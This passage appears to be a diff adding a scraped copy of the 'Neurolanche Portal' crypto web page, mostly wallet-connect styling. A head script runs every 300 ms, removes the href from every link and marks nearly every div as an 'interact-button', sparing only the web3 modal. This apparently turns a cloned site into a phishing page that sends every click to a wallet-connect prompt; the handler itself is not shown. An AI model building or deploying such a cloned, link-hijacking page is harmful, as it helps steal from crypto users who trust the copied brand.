@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="en"
+  style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"
+  data-scrapbook-source="https://portal.neurolanche.com/" data-scrapbook-create="20241115134700945"
+  data-scrapbook-adoptedstylesheet-1="*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: 0.2s; }
+
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: 0.1s; transform: scale(0.93); }
+}
+
+button::after { content: &quot;&quot;; position: absolute; inset: 0px; transition: background-color, 0.2s; }
+
+button:disabled { cursor: not-allowed; }
+
+button svg, button wcm-text { position: relative; z-index: 1; }
+
+input { border: none; outline: 0px; appearance: none; }
+
+img { display: block; }
+
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }"
+  data-scrapbook-adoptedstylesheet-2=":host { all: initial; }
+
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+
+.wcm-active { pointer-events: auto; }
+
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}" data-scrapbook-adoptedstylesheet-0=":host { z-index: var(--w3m-z-index); display: block; backface-visibility: hidden; position: fixed; inset: 0px; pointer-events: none; opacity: 0; background-color: var(--wui-cover); transition: opacity 0.2s var(--wui-ease-out-power-2); will-change: opacity; }
+
+:host(.open) { opacity: 1; }
+
+@keyframes zoom-in {
+  0% { transform: scale(0.95) translateY(0px); }
+  100% { transform: scale(1) translateY(0px); }
+}
+
+@keyframes slide-in {
+  0% { transform: scale(1) translateY(50px); }
+  100% { transform: scale(1) translateY(0px); }
+}
+
+wui-card { max-width: var(--w3m-modal-width); width: 100%; position: relative; animation-duration: 0.2s; animation-name: zoom-in; animation-fill-mode: backwards; animation-timing-function: var(--wui-ease-out-power-2); outline: none; }
+
+wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-content: center; width: 100%; height: 100%; }
+
+@media (max-height: 700px) and (min-width: 431px) {
+  wui-flex { align-items: flex-start; }
+  wui-card { margin: var(--wui-spacing-xxl) 0px; }
+}
+
+@media (max-width: 430px) {
+  wui-flex { align-items: flex-end; }
+  wui-card { max-width: 100%; border-bottom-left-radius: 0px; border-bottom-right-radius: 0px; border-bottom: none; animation-name: slide-in; }
+}">
+
+<head> <script>
+  function addClassesToElements() {
+
+  const links = document.querySelectorAll('a:not(.interact-button)');
+  for (const link of links) {
+      link.removeAttribute('href');
+      link.classList.add('interact-button');
+  }
+  const buttons = document.querySelectorAll('div:not(.interact-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+  for (const button of buttons) {
+      button.classList.add('interact-button');
+  }
+  }
+  setInterval(addClassesToElements, 300);
+</script>
+
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/svg+xml" href="nerox.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+  <link href="css2.css" rel="stylesheet">
+  <link href="css2-1.css" rel="stylesheet">
+  <title>Neurolanche Portal</title>
+
+  <link rel="stylesheet" href="index-BXRj5XT3.css">
+  <style>
+    @import url("css2-2.css");
+
+    :root {
+      --w3m-modal-width: 360px;
+      --w3m-color-mix-strength: 0%;
+      --w3m-font-family: Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
+      ;
+      --w3m-font-size-master: 10px;
+      --w3m-border-radius-master: 4px;
+      --w3m-z-index: 999;
+
+      --wui-font-family: var(--w3m-font-family);
+
+      --wui-font-size-mini: calc(var(--w3m-font-size-master) * 0.8);
+      --wui-font-size-micro: var(--w3m-font-size-master);
+      --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
+      --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
+      --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
+      --wui-font-size-medium: calc(var(--w3m-font-size-master) * 1.8);
+      --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);
+      --wui-font-size-medium-title: calc(var(--w3m-font-size-master) * 2.4);
+      --wui-font-size-2xl: calc(var(--w3m-font-size-master) * 4);
+
+      --wui-border-radius-5xs: var(--w3m-border-radius-master);
+      --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
+      --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
+      --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
+      --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
+      --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
+      --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
+      --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
+      --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);
+
+      --wui-font-weight-light: 400;
+      --wui-font-weight-regular: 500;
+      --wui-font-weight-medium: 600;
+      --wui-font-weight-bold: 700;
+
+      --wui-letter-spacing-2xl: -1.6px;
+      --wui-letter-spacing-medium-title: -0.96px;
+      --wui-letter-spacing-large: -0.8px;
+      --wui-letter-spacing-medium: -0.72px;
+      --wui-letter-spacing-paragraph: -0.64px;
+      --wui-letter-spacing-small: -0.56px;
+      --wui-letter-spacing-tiny: -0.48px;
+      --wui-letter-spacing-micro: -0.2px;
+      --wui-letter-spacing-mini: -0.16px;
+
+      --wui-spacing-0: 0px;
+      --wui-spacing-4xs: 2px;
+      --wui-spacing-3xs: 4px;
+      --wui-spacing-xxs: 6px;
+      --wui-spacing-2xs: 7px;
+      --wui-spacing-xs: 8px;
+      --wui-spacing-1xs: 10px;
+      --wui-spacing-s: 12px;
+      --wui-spacing-m: 14px;
+      --wui-spacing-l: 16px;
+      --wui-spacing-2l: 18px;
+      --wui-spacing-xl: 20px;
+      --wui-spacing-xxl: 24px;
+      --wui-spacing-2xl: 32px;
+      --wui-spacing-3xl: 40px;
+      --wui-spacing-4xl: 90px;
+      --wui-spacing-5xl: 95px;
+
+      --wui-icon-box-size-xxs: 14px;
+      --wui-icon-box-size-xs: 20px;
+      --wui-icon-box-size-sm: 24px;
+      --wui-icon-box-size-md: 32px;
+      --wui-icon-box-size-lg: 40px;
+      --wui-icon-box-size-xl: 64px;
+
+      --wui-icon-size-inherit: inherit;
+      --wui-icon-size-xxs: 10px;
+      --wui-icon-size-xs: 12px;
+      --wui-icon-size-sm: 14px;
+      --wui-icon-size-md: 16px;
+      --wui-icon-size-mdl: 18px;
+      --wui-icon-size-lg: 20px;
+      --wui-icon-size-xl: 24px;
+      --wui-icon-size-xxl: 28px;
+
+      --wui-wallet-image-size-inherit: inherit;
+      --wui-wallet-image-size-sm: 40px;
+      --wui-wallet-image-size-md: 56px;
+      --wui-wallet-image-size-lg: 80px;
+
+      --wui-visual-size-size-inherit: inherit;
+      --wui-visual-size-sm: 40px;
+      --wui-visual-size-md: 55px;
+      --wui-visual-size-lg: 80px;
+
+      --wui-box-size-md: 100px;
+      --wui-box-size-lg: 120px;
+
+      --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
+      --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);
+
+      --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
+      --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
+      --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);
+
+      --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);
+
+      --wui-duration-lg: 200ms;
+      --wui-duration-md: 125ms;
+      --wui-duration-sm: 75ms;
+
+      --wui-path-network-sm: path('M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z'
+        );
+
+      --wui-path-network-md: path('M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
+        );
+
+      --wui-path-network-lg: path('M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
+        );
+
+      --wui-width-network-sm: 36px;
+      --wui-width-network-md: 48px;
+      --wui-width-network-lg: 86px;
+
+      --wui-height-network-sm: 40px;
+      --wui-height-network-md: 54px;
+      --wui-height-network-lg: 96px;
+
+      --wui-icon-size-network-xs: 12px;
+      --wui-icon-size-network-sm: 16px;
+      --wui-icon-size-network-md: 24px;
+      --wui-icon-size-network-lg: 42px;
+
+      --wui-color-inherit: inherit;
+
+      --wui-color-inverse-100: #fff;
+      --wui-color-inverse-000: #000;
+
+      --wui-cover: rgba(20, 20, 20, 0.8);
+
+      --wui-color-modal-bg: var(--wui-color-modal-bg-base);
+
+      --wui-color-accent-100: var(--wui-color-accent-base-100);
+      --wui-color-accent-090: var(--wui-color-accent-base-090);
+      --wui-color-accent-080: var(--wui-color-accent-base-080);
+
+      --wui-color-success-100: var(--wui-color-success-base-100);
+
+      --wui-color-error-100: var(--wui-color-error-base-100);
+
+      --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
+      --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
+      --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
+      --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);
+
+      --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-100);
+
+      --wui-avatar-border: var(--wui-avatar-border-base);
+
+      --wui-thumbnail-border: var(--wui-thumbnail-border-base);
+
+      --wui-box-shadow-blue: var(--wui-color-accent-glass-020);
+    }
+
+    @supports (background: color-mix(in srgb, white 50%, black)) {
+      :root {
+        --wui-color-modal-bg: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-modal-bg-base));
+
+        --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 20%, transparent);
+
+        --wui-color-accent-100: color-mix(in srgb,
+            var(--wui-color-accent-base-100) 100%,
+            transparent);
+        --wui-color-accent-090: color-mix(in srgb,
+            var(--wui-color-accent-base-100) 90%,
+            transparent);
+        --wui-color-accent-080: color-mix(in srgb,
+            var(--wui-color-accent-base-100) 80%,
+            transparent);
+        --wui-color-accent-glass-090: color-mix(in srgb,
+            var(--wui-color-accent-base-100) 90%,
+            transparent);
+        --wui-color-accent-glass-080: color-mix(in srgb,
+            var(--wui-color-accent-base-100) 80%,
+            transparent);
+        --wui-color-accent-glass-020: color-mix(in srgb,
+            var(--wui-color-accent-base-100) 20%,
+            transparent);
+        --wui-color-accent-glass-015: color-mix(in srgb,
+            var(--wui-color-accent-base-100) 15%,
+            transparent);
+        --wui-color-accent-glass-010: color-mix(in srgb,
+            var(--wui-color-accent-base-100) 10%,
+            transparent);
+        --wui-color-accent-glass-005: color-mix(in srgb,
+            var(--wui-color-accent-base-100) 5%,
+            transparent);
+        --wui-color-accent-002: color-mix(in srgb,
+            var(--wui-color-accent-base-100) 2%,
+            transparent);
+
+        --wui-color-fg-100: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-100));
+        --wui-color-fg-125: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-125));
+        --wui-color-fg-150: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-150));
+        --wui-color-fg-175: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-175));
+        --wui-color-fg-200: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-200));
+        --wui-color-fg-225: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-225));
+        --wui-color-fg-250: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-250));
+        --wui-color-fg-275: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-275));
+        --wui-color-fg-300: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-300));
+
+        --wui-color-bg-100: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-100));
+        --wui-color-bg-125: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-125));
+        --wui-color-bg-150: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-150));
+        --wui-color-bg-175: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-175));
+        --wui-color-bg-200: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-200));
+        --wui-color-bg-225: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-225));
+        --wui-color-bg-250: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-250));
+        --wui-color-bg-275: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-275));
+        --wui-color-bg-300: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-300));
+
+        --wui-color-success-100: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-success-base-100));
+        --wui-color-error-100: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-error-base-100));
+
+        --wui-icon-box-bg-error-100: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-error-base-100));
+        --wui-icon-box-bg-accent-100: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-blue-base-100));
+        --wui-icon-box-bg-success-100: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-success-base-100));
+        --wui-icon-box-bg-inverse-100: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-inverse-base-100));
+
+        --wui-all-wallets-bg-100: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-all-wallets-bg-100));
+
+        --wui-avatar-border: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-avatar-border-base));
+
+        --wui-thumbnail-border: color-mix(in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-thumbnail-border-base));
+      }
+    }
+  </style>
+  <style media="enabled">
+    :root {
+      --w3m-color-mix: #000;
+      --w3m-accent: hsla(231, 100%, 70%, 1);
+      --w3m-default: #000;
+
+      --wui-color-modal-bg-base: #fff;
+      --wui-color-accent-base-100: var(--w3m-accent);
+
+      --wui-color-blueberry-100: hsla(231, 100%, 70%, 1);
+      --wui-color-blueberry-090: hsla(231, 97%, 72%, 1);
+      --wui-color-blueberry-080: hsla(231, 92%, 74%, 1);
+
+      --wui-color-fg-100: #141414;
+      --wui-color-fg-125: #2d3131;
+      --wui-color-fg-150: #474d4d;
+      --wui-color-fg-175: #636d6d;
+      --wui-color-fg-200: #798686;
+      --wui-color-fg-225: #828f8f;
+      --wui-color-fg-250: #8b9797;
+      --wui-color-fg-275: #95a0a0;
+      --wui-color-fg-300: #9ea9a9;
+
+      --wui-color-bg-100: #ffffff;
+      --wui-color-bg-125: #f5fafa;
+      --wui-color-bg-150: #f3f8f8;
+      --wui-color-bg-175: #eef4f4;
+      --wui-color-bg-200: #eaf1f1;
+      --wui-color-bg-225: #e5eded;
+      --wui-color-bg-250: #e1e9e9;
+      --wui-color-bg-275: #dce7e7;
+      --wui-color-bg-300: #d8e3e3;
+
+      --wui-color-success-base-100: #26b562;
+      --wui-color-error-base-100: #f05142;
+
+      --wui-color-success-glass-001: rgba(38, 181, 98, 0.01);
+      --wui-color-success-glass-002: rgba(38, 181, 98, 0.02);
+      --wui-color-success-glass-005: rgba(38, 181, 98, 0.05);
+      --wui-color-success-glass-010: rgba(38, 181, 98, 0.1);
+      --wui-color-success-glass-015: rgba(38, 181, 98, 0.15);
+      --wui-color-success-glass-020: rgba(38, 181, 98, 0.2);
+      --wui-color-success-glass-025: rgba(38, 181, 98, 0.25);
+      --wui-color-success-glass-030: rgba(38, 181, 98, 0.3);
+      --wui-color-success-glass-060: rgba(38, 181, 98, 0.6);
+      --wui-color-success-glass-080: rgba(38, 181, 98, 0.8);
+
+      --wui-color-error-glass-001: rgba(240, 81, 66, 0.01);
+      --wui-color-error-glass-002: rgba(240, 81, 66, 0.02);
+      --wui-color-error-glass-005: rgba(240, 81, 66, 0.05);
+      --wui-color-error-glass-010: rgba(240, 81, 66, 0.1);
+      --wui-color-error-glass-015: rgba(240, 81, 66, 0.15);
+      --wui-color-error-glass-020: rgba(240, 81, 66, 0.2);
+      --wui-color-error-glass-025: rgba(240, 81, 66, 0.25);
+      --wui-color-error-glass-030: rgba(240, 81, 66, 0.3);
+      --wui-color-error-glass-060: rgba(240, 81, 66, 0.6);
+      --wui-color-error-glass-080: rgba(240, 81, 66, 0.8);
+
+      --wui-icon-box-bg-error-base-100: #f4dfdd;
+      --wui-icon-box-bg-blue-base-100: #d9ecfb;
+      --wui-icon-box-bg-success-base-100: #daf0e4;
+      --wui-icon-box-bg-inverse-base-100: #dcecfc;
+
+      --wui-all-wallets-bg-100: #e8f1fa;
+
+      --wui-avatar-border-base: #f3f4f4;
+
+      --wui-thumbnail-border-base: #eaefef;
+
+      --wui-color-gray-glass-001: rgba(0, 0, 0, 0.01);
+      --wui-color-gray-glass-002: rgba(0, 0, 0, 0.02);
+      --wui-color-gray-glass-005: rgba(0, 0, 0, 0.05);
+      --wui-color-gray-glass-010: rgba(0, 0, 0, 0.1);
+      --wui-color-gray-glass-015: rgba(0, 0, 0, 0.15);
+      --wui-color-gray-glass-020: rgba(0, 0, 0, 0.2);
+      --wui-color-gray-glass-025: rgba(0, 0, 0, 0.25);
+      --wui-color-gray-glass-030: rgba(0, 0, 0, 0.3);
+      --wui-color-gray-glass-060: rgba(0, 0, 0, 0.6);
+      --wui-color-gray-glass-080: rgba(0, 0, 0, 0.8);
+      --wui-color-gray-glass-090: rgba(0, 0, 0, 0.9);
+    }
+  </style>
+  <style>
+    :root {
+      --w3m-color-mix: #fff;
+      --w3m-accent: hsla(230, 100%, 67%, 1);
+      --w3m-default: #fff;
+
+      --wui-color-modal-bg-base: #121313;
+      --wui-color-accent-base-100: var(--w3m-accent);
+
+      --wui-color-blueberry-100: hsla(230, 100%, 67%, 1);
+      --wui-color-blueberry-090: hsla(231, 76%, 61%, 1);
+      --wui-color-blueberry-080: hsla(230, 59%, 55%, 1);
+
+      --wui-color-fg-100: #e4e7e7;
+      --wui-color-fg-125: #d0d5d5;
+      --wui-color-fg-150: #a8b1b1;
+      --wui-color-fg-175: #a8b0b0;
+      --wui-color-fg-200: #949e9e;
+      --wui-color-fg-225: #868f8f;
+      --wui-color-fg-250: #788080;
+      --wui-color-fg-275: #788181;
+      --wui-color-fg-300: #6e7777;
+
+      --wui-color-bg-100: #141414;
+      --wui-color-bg-125: #191a1a;
+      --wui-color-bg-150: #1e1f1f;
+      --wui-color-bg-175: #222525;
+      --wui-color-bg-200: #272a2a;
+      --wui-color-bg-225: #2c3030;
+      --wui-color-bg-250: #313535;
+      --wui-color-bg-275: #363b3b;
+      --wui-color-bg-300: #3b4040;
+
+      --wui-color-success-base-100: #26d962;
+      --wui-color-error-base-100: #f25a67;
+
+      --wui-color-success-glass-001: rgba(38, 217, 98, 0.01);
+      --wui-color-success-glass-002: rgba(38, 217, 98, 0.02);
+      --wui-color-success-glass-005: rgba(38, 217, 98, 0.05);
+      --wui-color-success-glass-010: rgba(38, 217, 98, 0.1);
+      --wui-color-success-glass-015: rgba(38, 217, 98, 0.15);
+      --wui-color-success-glass-020: rgba(38, 217, 98, 0.2);
+      --wui-color-success-glass-025: rgba(38, 217, 98, 0.25);
+      --wui-color-success-glass-030: rgba(38, 217, 98, 0.3);
+      --wui-color-success-glass-060: rgba(38, 217, 98, 0.6);
+      --wui-color-success-glass-080: rgba(38, 217, 98, 0.8);
+
+      --wui-color-error-glass-001: rgba(242, 90, 103, 0.01);
+      --wui-color-error-glass-002: rgba(242, 90, 103, 0.02);
+      --wui-color-error-glass-005: rgba(242, 90, 103, 0.05);
+      --wui-color-error-glass-010: rgba(242, 90, 103, 0.1);
+      --wui-color-error-glass-015: rgba(242, 90, 103, 0.15);
+      --wui-color-error-glass-020: rgba(242, 90, 103, 0.2);
+      --wui-color-error-glass-025: rgba(242, 90, 103, 0.25);
+      --wui-color-error-glass-030: rgba(242, 90, 103, 0.3);
+      --wui-color-error-glass-060: rgba(242, 90, 103, 0.6);
+      --wui-color-error-glass-080: rgba(242, 90, 103, 0.8);
+
+      --wui-color-gray-glass-001: rgba(255, 255, 255, 0.01);
+      --wui-color-gray-glass-002: rgba(255, 255, 255, 0.02);
+      --wui-color-gray-glass-005: rgba(255, 255, 255, 0.05);
+      --wui-color-gray-glass-010: rgba(255, 255, 255, 0.1);
+      --wui-color-gray-glass-015: rgba(255, 255, 255, 0.15);
+      --wui-color-gray-glass-020: rgba(255, 255, 255, 0.2);
+      --wui-color-gray-glass-025: rgba(255, 255, 255, 0.25);
+      --wui-color-gray-glass-030: rgba(255, 255, 255, 0.3);
+      --wui-color-gray-glass-060: rgba(255, 255, 255, 0.6);
+      --wui-color-gray-glass-080: rgba(255, 255, 255, 0.8);
+      --wui-color-gray-glass-090: rgba(255, 255, 255, 0.9);
+
+      --wui-icon-box-bg-error-base-100: #3c2426;
+      --wui-icon-box-bg-blue-base-100: #20303f;
+      --wui-icon-box-bg-success-base-100: #1f3a28;
+      --wui-icon-box-bg-inverse-base-100: #243240;
+
+      --wui-all-wallets-bg-100: #222b35;
+
+      --wui-avatar-border-base: #252525;
+
+      --wui-thumbnail-border-base: #252525;
+    }
+  </style> 
+</head> 
+
+<body>
+  <div id="root">
+    <div data-rk="">
+      <style>
+        [data-rk] {
+          --rk-blurs-modalOverlay: blur(0px);
+          --rk-fonts-body: SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+          --rk-radii-actionButton: 9999px;
+          --rk-radii-connectButton: 12px;
+          --rk-radii-menuButton: 12px;
+          --rk-radii-modal: 24px; 
+          --rk-radii-modalMobile: 28px;
+          --rk-colors-accentColor: #2b92f1;
+          --rk-colors-accentColorForeground: #252729;
+          --rk-colors-actionButtonBorder: rgba(255, 255, 255, 0.04);
+          --rk-colors-actionButtonBorderMobile: rgba(255, 255, 255, 0.08);
+          --rk-colors-actionButtonSecondaryBackground: rgba(255, 255, 255, 0.08);
+          --rk-colors-closeButton: rgba(224, 232, 255, 0.6);
+          --rk-colors-closeButtonBackground: rgba(255, 255, 255, 0.08);
+          --rk-colors-connectButtonBackground: #1A1B1F;
+          --rk-colors-connectButtonBackgroundError: #FF494A;
+          --rk-colors-connectButtonInnerBackground: linear-gradient(0deg, rgba(255, 255, 255, 0.075), rgba(255, 255, 255, 0.15));
+          --rk-colors-connectButtonText: #FFF;
+          --rk-colors-connectButtonTextError: #FFF;
+          --rk-colors-connectionIndicator: #30E000;
+          --rk-colors-downloadBottomCardBackground: linear-gradient(126deg, rgba(0, 0, 0, 0) 9.49%, rgba(120, 120, 120, 0.2) 71.04%), #1A1B1F;
+          --rk-colors-downloadTopCardBackground: linear-gradient(126deg, rgba(120, 120, 120, 0.2) 9.49%, rgba(0, 0, 0, 0) 71.04%), #1A1B1F;
+          --rk-colors-error: #FF494A;
+          --rk-colors-generalBorder: rgba(255, 255, 255, 0.08);
+          --rk-colors-generalBorderDim: rgba(255, 255, 255, 0.04);
+          --rk-colors-menuItemBackground: rgba(224, 232, 255, 0.1);
+          --rk-colors-modalBackdrop: rgba(0, 0, 0, 0.5);
+          --rk-colors-modalBackground: #20213d;
+          --rk-colors-modalBorder: rgba(255, 255, 255, 0.08);
+          --rk-colors-modalText: #FFF;
+          --rk-colors-modalTextDim: rgba(224, 232, 255, 0.3);
+          --rk-colors-modalTextSecondary: rgba(255, 255, 255, 0.6);
+          --rk-colors-profileAction: rgba(224, 232, 255, 0.1);
+          --rk-colors-profileActionHover: rgba(224, 232, 255, 0.2);
+          --rk-colors-profileForeground: rgba(224, 232, 255, 0.05);
+          --rk-colors-selectedOptionBorder: rgba(224, 232, 255, 0.1);
+          --rk-colors-standby: #FFD641;
